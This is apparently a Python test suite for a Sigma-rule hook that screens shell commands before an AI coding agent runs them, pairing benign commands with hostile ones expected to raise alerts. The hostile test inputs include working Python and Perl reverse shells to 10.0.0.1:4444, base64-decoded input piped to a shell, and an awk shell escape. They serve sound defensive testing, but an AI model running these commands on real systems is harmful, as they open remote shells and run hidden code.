#!/usr/bin/env python3
"""Test suite for sigma_engine.py hook.

Runs the repo copy of the hook (not the installed one under ~/.claude). The
match-expecting cases need hooks/sigma_rules.json, which scripts/install.sh
compiles and which is gitignored; when it is absent the engine correctly no-ops,
so those cases are skipped rather than failed while the benign cases still assert
zero false matches. A fresh checkout is therefore green with or without rules.
"""

import json
import subprocess
import sys
from pathlib import Path

HOOKS_DIR = Path(__file__).resolve().parent.parent / "hooks"
GUARD = str(HOOKS_DIR / "sigma_engine.py")
RULES_PATH = HOOKS_DIR / "sigma_rules.json"

TEST_CASES = [
    # (name, command, should_match)
    ("benign ls", "ls -la", False),
    ("benign git", "git status", False),
    ("benign curl", "curl https://example.com", False),
    ("benign python", "python3 script.py", False),
    ("base64 pipe bash", "echo SGVsbG8= | base64 -d | bash", True),
    ("base64 pipe sh", "cat encoded.txt | base64 -d |sh", True),
    (
        "python revshell",
        'python3 -c "import socket,pty,os;s=socket.socket();'
        's.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);'
        'pty.spawn(\"/bin/sh\")"',
        True,
    ),
    ("python http.server", "python3 -m http.server 8080", True),
    (
        "awk shell",
        'awk \'BEGIN {system("/bin/sh")}\'',
        True,
    ),
    (
        "perl revshell",
        'perl -e \'use Socket;$i="10.0.0.1";'
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "connect(S,sockaddr_in(4444,inet_aton($i)));"
        'open(STDIN,">&S");exec("/bin/sh -i");\'',
        True,
    ),
    ("benign echo", "echo hello world", False),
    ("benign find", "find . -name '*.py'", False),
]


def run_guard(command):
    """Run sigma_engine.py with a test command and return the output."""
    test_input = {
        "tool_name": "Bash",
        "tool_input": {"command": command},
        "hook_event_name": "PreToolUse",
    }
    result = subprocess.run(
        [sys.executable, GUARD],
        input=json.dumps(test_input),
        capture_output=True,
        text=True,
        timeout=5,
    )
    try:
        return json.loads(result.stdout) if result.stdout.strip() else {}
    except json.JSONDecodeError:
        return {}


def _reason(output):
    """Pull the human-readable reason from either hook response shape.

    An ``ask`` uses hookSpecificOutput.permissionDecisionReason; a
    config-downgraded ``warn`` uses systemMessage.
    """
    hso = output.get("hookSpecificOutput")
    if isinstance(hso, dict) and hso.get("permissionDecisionReason"):
        return hso["permissionDecisionReason"]
    return output.get("systemMessage", "")


def main():
    rules_present = RULES_PATH.exists()
    if not rules_present:
        print(
            "  NOTE: hooks/sigma_rules.json absent (run scripts/install.sh to "
            "compile rules);\n        engine no-ops without rules, so "
            "match-expecting cases are skipped.\n"
        )

    passed = 0
    failed = 0
    skipped = 0

    for name, cmd, should_match in TEST_CASES:
        if should_match and not rules_present:
            skipped += 1
            print(f"  SKIP [.....] {name:25s} (needs compiled rules)")
            continue

        output = run_guard(cmd)
        matched = bool(output)

        if matched == should_match:
            status = "PASS"
            passed += 1
        else:
            status = "FAIL"
            failed += 1

        indicator = "ALERT" if matched else "pass "
        expect = "expect-alert" if should_match else "expect-pass"

        if status == "FAIL":
            print(f"  {status} [{indicator}] {name:25s} ({expect})")
            if matched:
                print(f"        Got: {_reason(output)[:100]}")
        else:
            detail = ""
            if matched:
                title_line = _reason(output).split("\n")[0]
                detail = f" -> {title_line[:50]}"
            print(f"  {status} [{indicator}] {name:25s}{detail}")

    total = len(TEST_CASES)
    print(f"\n  Results: {passed} passed, {failed} failed, {skipped} skipped out of {total}")
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
